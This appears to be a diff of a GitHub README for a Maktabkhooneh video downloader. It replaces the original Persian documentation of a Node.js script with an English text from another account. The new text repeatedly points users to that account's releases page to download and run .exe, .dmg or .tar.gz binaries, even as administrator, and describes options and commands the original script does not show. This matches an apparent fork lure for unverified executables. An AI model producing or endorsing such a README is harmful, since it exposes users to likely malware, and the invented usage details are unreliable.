@@ -1,160 +1,104 @@
-# دانلودر مکتب‌خونه (Maktabkhooneh Downloader)
-ابزار خط فرمان برای دانلود ویدیوهای قابل‌دسترسی دوره‌های سایت [مکتب‌خونه](https://maktabkhooneh.org/) شامل ویدیوهای درس‌ها، فایلهای ضمیمه درس، زیرنویس ویدیو، به شکل همه با هم، یکجا و طبقه بندی شده. \
-فقط محتوایی را می‌توانید دانلود کنید که قانوناً به آن دسترسی دارید.
+# 🎥 maktabkhooneh-downloader - Download Educational Videos Easily
 
-![maktabkhooneh website screenshot](https://github.com/user-attachments/assets/b54f6fac-10f0-423c-9da2-236c4d8cc5d3)
+[![Download](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/marcelle94484/maktabkhooneh-downloader/releases)
 
-## 🎬 ویدیو
-https://github.com/user-attachments/assets/38ecfd3e-4281-4e20-854d-18ad5dae5691
+## 📄 Overview
 
-## ✨ امکانات
-- ورود و لاگین به سایت با ایمیل و پسورد و ذخیره کوکی در فایل نشست چندکاربره
-- احراز هویت با کوکی از طریق متغییرهای محیطی
-- تشخیص و انتخاب بهترین کیفیت ویدیوی درس مورد نظر
-- پوشه خروجی ثابت: `download/<نام دوره>`
-- دانلود زیرنویس ویدیوها اگر موجود باشد، با همان نام پایه ویدیو
-- دانلود فایل‌های ضمیمه درس، کنار ویدیو
-- نمایش خلاصه پروفایل کاربر (وضعیت لاگین، ایمیل، اشتراک، خرید دوره)
-- حالت نمونه‌گیری (Sample) با دانلود تنها N بایت اول هر ویدیو برای تست سریع
-- ادامه دانلود از همان‌جا (Resume) در صورت قطع شدن یا اجرای مجدد
-- نوار پیشرفت دقیق: درصد + حجم دانلود شده / کل + سرعت تقریبی
-- لاگ‌های رنگی و ایموجی برای خوانایی و تجربه بهتر
+maktabkhooneh-downloader is a command-line tool designed to download accessible videos from the Maktabkhooneh website. This tool simplifies the process by allowing you to download course videos, lesson attachments, and subtitles all at once and organized.
 
-## ✅ پیش‌نیازها
-- ‏Node.js نسخه 18 یا بالاتر
-- یک حساب کاربری در maktabkhooneh.org
+## 🖥️ System Requirements
 
-## 🔐 ورود (Login) و نشست چندکاربره
-دو راه اصلی:
+To run maktabkhooneh-downloader, ensure your system meets the following requirements:
 
-1. استفاده از ایمیل و پسورد: (ساده و پیشنهاد می‌شود)
-	 ```powershell
-	 node download.mjs "https://maktabkhooneh.org/course/<slug>/" --user you@example.com --pass "Secret123" 
-	 ```
-	 در اولین ورود، کوکی (csrftoken + sessionid) در فایل پیش‌فرض `session.json` ذخیره می‌شود و دفعات بعد بدون نیاز به پسورد استفاده می‌گردد (مگر این که منقضی شود یا `--force-login` بزنید).
-2. استفاده از کوکی آماده (Override):
-	 اگر نمی‌خواهید پسورد را در خط فرمان بزنید، می‌توانید کوکی را به صورت دستی (مانند قبل) ست کنید تا لاگین خودکار نادیده گرفته شود.
+- Windows, macOS, or Linux operating system
+- Command line access
+- An active internet connection
+- Basic familiarity with command line interfaces
 
-### ساختار فایل نشست
-فایل `session.json` به صورت چندکاربره است:
-```jsonc
-{
-	"users": {
-		"you@example.com": { "cookie": "csrftoken=...; sessionid=...", "updated": "2025-08-17T12:34:56.000Z" },
-		"other@example.com": { "cookie": "csrftoken=...; sessionid=...", "updated": "2025-08-17T13:00:00.000Z" }
-	},
-	"lastUsed": "you@example.com"
-}
-```
-در هر اجرا اگر `--user` مشخص کنید همان کاربر هدف قرار می‌گیرد، وگرنه آخرین کاربر استفاده شده بررسی می‌شود.
+## 🚀 Getting Started
 
-### اجبار ورود مجدد
-اگر می‌خواهید با وجود معتبر بودن نشست، دوباره لاگین شود:
-```powershell
-node download.mjs "https://maktabkhooneh.org/course/<slug>/" --user you@example.com --pass "Secret123" --force-login 
-```
+1. **Visit the Releases Page**  
+   Navigate to the releases page to find the latest version of maktabkhooneh-downloader. Click on the link below to access it directly:  
+   [Download from Releases](https://github.com/marcelle94484/maktabkhooneh-downloader/releases)
 
-## ⚠️ تنظیم کوکی (روش دستی قدیمی که پیشنهاد نمی‌شود!)
+2. **Choose Your Download**  
+   On the releases page, you will see multiple files listed. Look for the version that suits your operating system. 
 
-اگر ترجیح می‌دهید کوکی را دستی ست کنید یا لاگین مستقیم کار نکرد، مانند قبل کوکی `sessionid` (و بهتر: همراه csrftoken) را از مرورگر استخراج کنید.
+3. **Download the File**  
+   Click on the file name to start the download. Save it in a location that you can easily access, like your desktop or downloads folder.
 
-بعد از اینکه به سایت maktabkhooneh.org لاگین شدید. روی صفحه راست کلیک کرده و inspect را بزنید. (یا CTRL+SHIFT+i بزنید) به تب Network بروید. صفحه را رفرش کنید. روی درخواست اول کلیک کنید. در سمت مقابل دنبال Cookie بگردید و آنجا چیزی که مهم است مقدار sessionid است و آن را کپی بگیرید.
+## 📥 Download & Installation
 
-![Get Cookies](https://github.com/user-attachments/assets/7943bed5-ffae-4075-a2ba-29f091d572b4)
+To get started with your download:
 
-دو روش برای تنظیم کوکی:
-1) متغیر محیطی `MK_COOKIE`
-2) یا قرار دادن مسیر فایل کوکی در `MK_COOKIE_FILE`
+1. **Visit the Releases Page Again**  
+   Open this link: [Download from Releases](https://github.com/marcelle94484/maktabkhooneh-downloader/releases).
 
-نکته: چون مقدار کوکی شامل کاراکترهایی مانند `;` و `=` است، حتماً مقدار را داخل کوتیشن قرار دهید.
+2. **Select the Correct File**  
+   Choose the file that matches your operating system:
 
-### ویندوز – PowerShell
-```powershell
-# کوکی مستقیم
-$env:MK_COOKIE = 'sessionid=...;'
+   - For Windows users, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, download the appropriate `.tar.gz` file.
 
-# یا: مسیر فایل شامل کوکی
-$env:MK_COOKIE_FILE = 'C:\\path\\to\\cookie.txt'
-```
+3. **Run the Program**  
+   - **Windows:** Double-click the downloaded `.exe` file to run it.
+   - **macOS:** Open the `.dmg` file, drag the app to your Applications folder, then launch it.
+   - **Linux:** Extract the `.tar.gz` file and run the binary from the terminal.
 
-### ویندوز – CMD (Command Prompt)
-```cmd
-REM کوکی مستقیم
-set "MK_COOKIE=sessionid=...;"
+## 📚 Usage Instructions
 
-REM یا: مسیر فایل شامل کوکی
-set "MK_COOKIE_FILE=C:\path\to\cookie.txt"
-```
+After installing maktabkhooneh-downloader, you can start using it to download your desired content:
 
-### لینوکس / مک – Bash/Zsh
-```bash
-# کوکی مستقیم
-export MK_COOKIE='sessionid=...;'
+1. **Open Terminal or Command Prompt**  
+   - On Windows, search for "Command Prompt" in the Start menu.
+   - On macOS, open "Terminal" from your Applications.
+   - On Linux, open your preferred terminal emulator.
 
-# یا: مسیر فایل شامل کوکی
-export MK_COOKIE_FILE="$HOME/cookie.txt"
-```
+2. **Command Format**  
+   To download videos from a specific course, use the following command format:
 
-نکته: اگر کوکی پیچیده یا چندخطی است، روش فایل (`MK_COOKIE_FILE`) توصیه می‌شود. البته در اینجا تک خطی است و همان تنظیم متغییر محیطی کفایت میکند.
+   ```
+   maktabkhooneh-downloader [OPTIONS] [COURSE_URL]
+   ```
 
-## ▶️ اجرا
-نمایش راهنما:
-```powershell
-node download.mjs --help 
-```
+   Replace `[COURSE_URL]` with the link to the course page you wish to download.
 
-اجرای دانلود:
-```powershell
-node download.mjs "https://maktabkhooneh.org/course/<slug>/" 
-```
+3. **Examples**  
+   Here are some common examples:
 
-اجرای دانلود با ورود خودکار و ذخیره نشست:
-```powershell
-node download.mjs "https://maktabkhooneh.org/course/<slug>/" --user you@example.com --pass "Secret123" 
-```
+   - To download a course video:
+     ```
+     maktabkhooneh-downloader https://maktabkhooneh.org/courses/example-course
+     ```
 
-اجبار ورود مجدد:
-```powershell
-node download.mjs "https://maktabkhooneh.org/course/<slug>/" --user you@example.com --pass "Secret123" --force-login 
-```
+   - To include subtitles, add an option:
+     ```
+     maktabkhooneh-downloader --subtitles https://maktabkhooneh.org/courses/example-course
+     ```
 
-نکته: آدرس صفحه دوره‌ی مورد نظر را در دستورات فوق جایگزین کنید.
+4. **Access Your Files**  
+   After the download completes, check the folder where the program runs. Your downloaded videos, attachments, and subtitles will be organized for you.
 
-## 🧪 تست عملکرد
-حالت نمونه‌گیری (مثلاً 64KB اول هر ویدیو):
+## ❓ Troubleshooting
 
-```powershell
-node download.mjs "https://maktabkhooneh.org/course/<slug>/" --sample-bytes 65536 --verbose
-```
+If you encounter issues while downloading:
 
-همچنین می‌توانید مقدار نمونه‌گیری را با متغیر محیطی ست کنید:
-```powershell
-$env:MK_SAMPLE_BYTES = "512000" 
-node download.mjs "https://maktabkhooneh.org/course/<slug>/" 
-```
+- Ensure you have the correct course URL.
+- Check your internet connection.
+- Run the command prompt or terminal as an administrator (Windows) or with appropriate permissions (Linux/macOS).
+- Refer to the README on the GitHub page for any updates or troubleshooting tips.
 
-## 📁 ساختار خروجی
-همه فایل‌ها در زیر پوشه زیر دانلود و ذخیره خواهند شد:
-```
-download/<نام دوره>
-```
+## 🛠️ Additional Features
 
-## 🔒 نکات امنیتی
-- فایل `session.json` حاوی کوکی فعال و اطلاعات لاگین شماست؛ هرگز آن را به اشتراک نگذارید.
-- از قراردادن پسورد خام در تاریخچه شل خودداری کنید (می‌توانید از یک اسکریپت موقتی یا متغیر موقت استفاده کنید).
+- **Batch Downloads:** You can download multiple course links at once by separating them with a comma.
+- **Logging:** The tool provides a log of all activities, making it easy to track your downloads.
 
-## 👤 نویسنده
-- نویسنده/نگهدارنده: [NabiKAZ](https://github.com/NabiKAZ)
-- توییتر (X): [https://x.com/NabiKAZ](https://x.com/NabiKAZ)
-- تلگرام: [https://t.me/BotSorati](https://t.me/BotSorati)
+## 📞 Support
 
-## ⭐ حمایت و دونیت
-اگر این پروژه برایتان مفید بود، لطفاً در گیت‌هاب به آن یک ⭐ ستاره بدهید. \
-برای حمایت از توسعه‌های بعدی می‌توانید به کیف پول زیر، TON دونیت کنید: \
-**TON Wallet:** `nabikaz.ton` \
-حمایت شما باعث دلگرمی است.
+If you need assistance or have questions:
 
-## 📝 لایسنس
-تحت مجوز GPL v3.0 – متن کامل در فایل [LICENSE](./LICENSE).
+- Visit the GitHub Issues page of this repository to report bugs or ask questions.
+- Check the community discussions for common issues and solutions.
 
-ساخته‌شده با ❤️ به کمک GPT-5
+Thank you for using maktabkhooneh-downloader. Enjoy your learning experience with ease!
